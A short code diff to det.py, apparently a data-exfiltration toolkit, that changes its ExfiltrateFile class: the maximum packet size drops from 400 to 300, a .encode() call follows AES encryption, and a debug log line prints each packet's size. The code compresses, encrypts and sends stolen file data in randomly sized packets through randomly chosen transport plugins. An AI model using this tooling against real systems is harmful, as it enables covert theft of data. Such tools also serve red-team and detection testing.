@@ -20,7 +20,7 @@ KEY = ""
 MIN_TIME_SLEEP = 1
 MAX_TIME_SLEEP = 30
 MIN_BYTES_READ = 1
-MAX_BYTES_READ = 400
+MAX_BYTES_READ = 300
 COMPRESSION    = True
 files = {}
 threads = []
@@ -261,18 +261,19 @@ class ExfiltrateFile(threading.Thread):
         data = e.read()
         if COMPRESSION:
             data = compress(data)
-        f.write(aes_encrypt(bytes(data), self.exfiltrate.KEY))
+        f.write(aes_encrypt(bytes(data), self.exfiltrate.KEY).encode())
         f.seek(0)
         e.close()
 
         packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ))
+            randomint = randint(MIN_BYTES_READ, MAX_BYTES_READ)
+            data_file = f.read(randomint)
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
             ok("Using {0} as transport method".format(plugin_name))
-            # info("Sending %s bytes packet" % len(data_file))
+            info("det.py: Sending %s bytes packet and randint=%s" % (len(data_file),randomint))
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
             plugin_send_function(data)
